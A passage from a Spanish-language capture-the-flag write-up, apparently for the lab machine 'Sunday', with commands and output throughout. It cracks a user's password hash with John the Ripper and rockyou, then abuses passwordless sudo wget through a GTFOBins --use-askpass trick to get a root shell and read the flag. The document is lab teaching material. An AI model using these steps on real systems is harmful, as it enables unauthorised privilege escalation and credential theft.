+sunny@sunday:/backup$</code></pre><p id="86d950d3-16ef-4132-88c8-b318174e2d9b" class="">
+</p><p id="99d41291-f881-4899-85c5-25ca38f85d7b" class="">Con John intentaría obtener la contraseña del usuario Sammy </p><pre id="1843aba3-21ae-4c56-9b41-65f691a2e5e1" class="code"><code class="language-javascript">❯ john hash.txt --w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+cooldude!        (sammy)
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed</code></pre><p id="8da8ccda-d747-4ed1-a89b-d9ce61b5ab63" class="">
+</p><p id="077bc29e-0fa6-4f62-a7c9-fec680e99be7" class="">Una vez siendo Sammy si listamos perimisos sudo vemos que podemos ejecutar wget como root.</p><pre id="810d5da0-b7ca-42ff-bac4-3fbb887cd90e" class="code"><code class="language-javascript">sammy@sunday:/home/sammy$ sudo -l
+User sammy may run the following commands on sunday:
+    (ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget</code></pre><p id="9cdcb7e4-e593-463d-b857-f2e1107486f4" class="">
+</p><p id="5cfca505-8f05-48cd-9a80-fcc599cf44e2" class="">Buscamos el binario en Gtfobins y nos da los siguientes comandos para convertirnos en root.</p><pre id="a30edf34-10a4-478d-aa4a-c39f38a7c8b8" class="code"><code class="language-javascript">TF=$(mktemp)
+chmod +x $TF
+echo -e &#x27;#!/bin/sh\n/bin/sh 1&gt;&amp;0&#x27; &gt;$TF
+sudo wget --use-askpass=$TF 0</code></pre><p id="e5698393-8a03-4865-80db-4a8a81e6f015" class="">
+</p><p id="be98d3da-e616-438a-b53b-91aefcdf2e4b" class="">Ejecutamos y somos root y ya podemos leer la flag.</p><pre id="f1fa209b-de21-44e3-9f3a-0d9eb869e59b" class="code"><code class="language-javascript">sammy@sunday:/home/sammy$ whoami
+sammy
+sammy@sunday:/home/sammy$ TF=$(mktemp)
+sammy@sunday:/home/sammy$ chmod +x $TF
+sammy@sunday:/home/sammy$ echo -e &#x27;#!/bin/sh\n/bin/sh 1&gt;&amp;0&#x27; &gt;$TF
+sammy@sunday:/home/sammy$ sudo wget --use-askpass=$TF 0
+root@sunday:/home/sammy# whoami
+root
+root@sunday:/home/sammy# cat /root/root.txt                                                                                                                      
+0a9706f6ad348fcf77d778956dcd49e5
+root@sunday:/home/sammy#</code></pre></div></article></body></html>
